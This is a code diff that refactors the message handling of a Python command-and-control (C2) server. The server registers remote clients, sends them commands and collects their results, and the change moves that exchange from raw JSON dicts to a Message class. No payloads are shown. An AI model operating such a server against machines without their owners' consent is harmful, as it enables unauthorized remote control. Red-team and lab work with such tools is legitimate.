@@ -15,6 +15,7 @@ import time
 import uuid
 import argparse
 from typing import Dict
+from message import Message
 
 # ==================== CONFIGURATION ====================
 
@@ -40,24 +41,20 @@ class ClientState:
 
 # ==================== MESSAGE HANDLING ====================
 
-async def send_message(writer, message: Dict) -> bool:
+async def send_message(writer, message: Message) -> bool:
     """
     Send JSON message to client
     Format: length_prefix(4 bytes)
     """
     try:        
-        # Wrap data
-        payload = json.dumps(message).encode()
-        
-        # Send with length prefix
-        writer.write(len(payload).to_bytes(4, 'big') + payload)
+        writer.write(message.to_payload())
         await writer.drain()
         return True
     except Exception as e:
         logger.error(f"Failed to send message: {e}")
         return False
 
-async def receive_message(reader) -> Dict:
+async def receive_message(reader) -> Message:
     """
     Receive JSON message from client
     """
@@ -68,9 +65,7 @@ async def receive_message(reader) -> Dict:
         
         # Read payload
         payload = await asyncio.wait_for(reader.readexactly(length), timeout=30)
-        plaintext = json.loads(payload.decode())
-        
-        return plaintext if plaintext else None
+        return Message.from_payload(payload)
     except asyncio.TimeoutError:
         logger.warning("Message receive timeout")
         return None
@@ -96,15 +91,16 @@ class C2Server:
         client_id = None
         client_state = None
         
+        logger.info("handle client")
         try:
             # Receive registration message
             msg = await receive_message(reader)
-            if not msg or msg.get("type") != "register":
+            if not msg or msg.type != "register":
                 logger.warning("Invalid registration message")
                 writer.close()
                 return
             
-            client_id = msg.get("client_id", f"client-{uuid.uuid4().hex[:8]}")
+            client_id = msg.client_id or f"client-{uuid.uuid4().hex[:8]}"
             client_state = ClientState(client_id, reader, writer)
             
             # Register client
@@ -112,7 +108,7 @@ class C2Server:
             logger.info(f"Client registered: {client_id}")
             
             # Send acknowledgment
-            await send_message(writer, {"type": "ack", "client_id": client_id})
+            await send_message(writer, Message.as_ack(client_id))
             
             # Main client loop
             await self._client_loop(client_state)
@@ -133,6 +129,8 @@ class C2Server:
             logger.exception(f"Error cleaning up client: {e}")
         finally:
             try:
+                if client_state is None:
+                    return
                 client_state.writer.close()
                 await client_state.writer.wait_closed()
             except Exception:
@@ -171,20 +169,14 @@ class C2Server:
                 if not msg:
                     break
                 
-                msg_type = msg.get("type")
-
-                if msg_type == "result":
-                    cmd_id = msg.get("cmd_id")
-                    result = msg.get("result", "")
-                    exec_time = msg.get("exec_time_ms", 0)
+                if msg.type == "result":
+                    logger.info(f"Result from {state.client_id}: {msg.result[:100]}")
                     
-                    logger.info(f"Result from {state.client_id}: {result[:100]}")
-                    
-                    if cmd_id in state.pending_results:
-                        del state.pending_results[cmd_id]
+                    if msg.cmd_id in state.pending_results:
+                        del state.pending_results[msg.cmd_id]
                 
                 else:
-                    logger.warning(f"Unknown message type: {msg_type}")
+                    logger.warning(f"Unknown message type: {msg.type}")
             
             except Exception as e:
                 logger.error(f"Command receiver error: {e}")
@@ -212,11 +204,7 @@ class C2Server:
                 # Send command to client
                 await send_message(
                     state.writer,
-                    {
-                        "type": "command",
-                        "cmd_id": cmd_id,
-                        "command": command
-                    },
+                    Message.as_command(cmd_id, command)
                 )
                 logger.info(f"Command sent to {state.client_id}: {command}")
             
